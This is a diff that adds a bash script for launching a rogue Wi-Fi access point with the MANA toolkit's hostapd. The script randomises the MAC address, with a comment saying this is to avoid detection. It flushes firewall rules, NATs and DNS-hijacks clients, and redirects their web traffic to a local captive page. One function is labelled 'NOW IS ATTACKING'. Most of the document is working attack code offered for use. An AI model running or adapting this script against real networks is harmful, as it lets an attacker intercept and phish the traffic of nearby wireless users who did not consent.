@@ -1,0 +1,212 @@
+#!/bin/bash
+upstream=$2
+wlan=$3
+Setting=$1
+conf=`pwd`/../conf/hostapd-mana.conf
+hostapd=`pwd`/../hostapd/hostapd
+touch /var/log/dnsmasq.leases
+rm -rf /etc/nginx/sites-enabled/default
+
+function nginx_server() {
+  echo \
+  """
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+  worker_connections 768;
+}
+
+http {
+  sendfile on;
+  tcp_nopush on;
+  tcp_nodelay on;
+  keepalive_timeout 65;
+  types_hash_max_size 2048;
+  server {
+  	listen 80 default_server;
+  	server_name _;
+    location = / {
+      proxy_pass http://10.0.0.1:8080/ ;
+    }
+  	rewrite ^/(.*) http://10.0.0.1:8080/ redirect;
+  	access_log off;
+  }
+  include /etc/nginx/mime.types;
+  default_type application/octet-stream;
+
+  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
+  ssl_prefer_server_ciphers on;
+
+  access_log /var/log/nginx/access.log;
+  error_log /var/log/nginx/error.log;
+
+  gzip on;
+  include /etc/nginx/conf.d/*.conf;
+  include /etc/nginx/sites-enabled/*;
+}
+  """ > /etc/nginx/nginx.conf
+  echo \
+  '''
+server.modules = (
+	"mod_access",
+	"mod_alias",
+	"mod_compress",
+ 	"mod_redirect",
+)
+
+server.document-root        = "/var/www/html"
+server.upload-dirs          = ( "/var/cache/lighttpd/uploads" )
+server.errorlog             = "/var/log/lighttpd/error.log"
+server.pid-file             = "/var/run/lighttpd.pid"
+server.username             = "www-data"
+server.groupname            = "www-data"
+server.port                 = 8080
+
+
+index-file.names            = ( "index.php", "index.html", "index.lighttpd.html" )
+url.access-deny             = ( "~", ".inc" )
+static-file.exclude-extensions = ( ".php", ".pl", ".fcgi" )
+
+compress.cache-dir          = "/var/cache/lighttpd/compress/"
+compress.filetype           = ( "application/javascript", "text/css", "text/html", "text/plain" )
+
+include_shell "/usr/share/lighttpd/use-ipv6.pl " + server.port
+include_shell "/usr/share/lighttpd/create-mime.assign.pl"
+include_shell "/usr/share/lighttpd/include-conf-enabled.pl"
+  ''' > /etc/lighttpd/lighttpd.conf
+  service nginx stop
+  service nginx start
+  service lighttpd stop
+  service lighttpd start
+}
+
+function network-manager() {
+  if [[ "$network" = "off" ]]; then
+    echo "[+]Stoping network-manager"
+    service network-manager stop
+  elif [[ "$network" = "on" ]]; then
+    echo "[+]Starting network-manager"
+    service network-manager stop
+  fi
+}
+
+function macchanger-fun() {
+  ifconfig $wlan down          #关闭网卡
+  echo "[+]Changer wireless card's mac..."
+  nohup macchanger -r $wlan        #更改网卡的Mac,防止被检测
+  ifconfig $wlan up     #开启网卡
+}
+
+function check_hostapd() {
+  echo "[+]Check hostapd"
+  if [[ ! -x "$hostapd" ]]; then
+      cp -rf /usr/lib/mana-toolkit/hostapd* `pwd`/../hostapd/
+      chmod 777 `pwd`/../hostapd/*
+      if [[ "$?" != 0 ]];then
+          exit
+      fi
+  fi
+}
+
+function start-dns() {
+    echo "Starting DNS and DHCP servers"
+    dnsmasq -z -C `pwd`/../conf/dnsmasq-dhcpd.conf -i $wlan -I lo          #开启Dns服务器
+}
+
+function fhq() {
+  echo "[+]Stoping iptables"
+  echo '1' > /proc/sys/net/ipv4/ip_forward
+  iptables --policy INPUT ACCEPT
+  iptables --policy FORWARD ACCEPT
+  iptables --policy OUTPUT ACCEPT
+  iptables -F
+  iptables -t nat -F
+  iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
+  iptables -A FORWARD -i $wlan -o $upstream -j ACCEPT
+  iptables -t nat -A PREROUTING -i $wlan -p udp --dport 53 -j DNAT --to 10.0.0.1
+  #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
+}
+
+function attack() {
+  echo -e "\033[31m[+]NOW IS ATTACKING\033[0m"
+  sed -i "s/^interface=.*$/interface=$wlan/" $conf
+  xterm -e "$hostapd $conf" &
+  gnome-terminal -e "python3 `pwd`/dhcp-status.py"
+  sleep 5
+  ifconfig $wlan 10.0.0.1 netmask 255.255.255.0
+  route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+}
+
+function off() {
+  echo -e "\033[31m[!]Hit enter to kill me\033[0m"
+  read
+
+  pkill dnsmasq
+  pkill hostapd
+  pkill python
+  pkill xterm
+  service nginx stop
+  service lighttpd stop
+  iptables --policy INPUT ACCEPT
+  iptables --policy FORWARD ACCEPT
+  iptables --policy OUTPUT ACCEPT
+  iptables -t nat -F
+  rm /var/log/dnsmasq.leases 
+  echo 'Exitting...'
+  rm `pwd`/nohup.out #if you don't want debug
+}
+
+function web() {
+  sed -i "s/^interface=.*$/interface=$wlan/" $conf
+  xterm -e "$hostapd $conf" &
+  sleep 5
+  ifconfig $wlan 10.0.0.1 netmask 255.255.255.0
+  route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+  xterm -e "python `pwd`/../conf/dns.py" &
+  nohup dnsmasq -z -C `pwd`/../conf/dnsmasq-web.conf -i $wlan -I lo          #开启Dns服务器
+  nginx_server
+  gnome-terminal -e "python3 `pwd`/dhcp-status.py"
+  xterm -e "python3 `pwd`/../conf/dns.py" &
+  echo '1' > /proc/sys/net/ipv4/ip_forward
+  iptables --policy INPUT ACCEPT
+  iptables --policy FORWARD ACCEPT
+  iptables --policy OUTPUT ACCEPT
+  iptables -F
+  iptables -t nat -F
+  iptables -t nat -A PREROUTING -i $wlan -p udp --dport 53 -j DNAT --to 10.0.0.1
+}
+
+function main() {
+  if [[ "$web" = "yes" ]];then
+    check_hostapd
+    network=off
+    network-manager
+    macchanger-fun
+    web
+    off
+  elif [[ "$web" = "no" ]]; then
+    check_hostapd
+    network=off
+    network-manager
+    macchanger-fun
+    attack
+    start-dns
+    fhq
+    off
+  fi
+}
+
+if [[ "$1" = "-web" ]];then
+	web=yes
+	main
+else
+	web=no
+	upstream=$1
+	wlan=$2
+	main
+fi
+
+trap off SIGINT SIGHUP
